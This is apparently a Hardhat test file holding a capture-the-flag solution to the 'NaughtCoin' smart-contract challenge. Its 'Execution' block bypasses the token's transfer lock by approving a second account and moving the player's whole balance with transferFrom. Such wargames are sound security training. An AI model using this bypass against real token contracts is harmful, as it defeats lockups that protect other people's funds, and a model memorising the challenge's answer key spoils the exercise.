import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { Contract } from 'ethers';

const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] NaughtCoin', function () {
  let deployer, player: SignerWithAddress, someUser: SignerWithAddress;
  let naughtCoin: Contract;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    [deployer, player, someUser] = await ethers.getSigners();

    naughtCoin = await (
      await ethers.getContractFactory('NaughtCoin', player)
    ).deploy(player.address);
  });

  it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    const playerBalance = await naughtCoin.balanceOf(player.address);

    await naughtCoin.connect(player).approve(someUser.address, playerBalance);

    await naughtCoin
      .connect(someUser)
      .transferFrom(player.address, someUser.address, playerBalance);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    expect(await naughtCoin.balanceOf(player.address)).to.be.equal(0);
  });
});
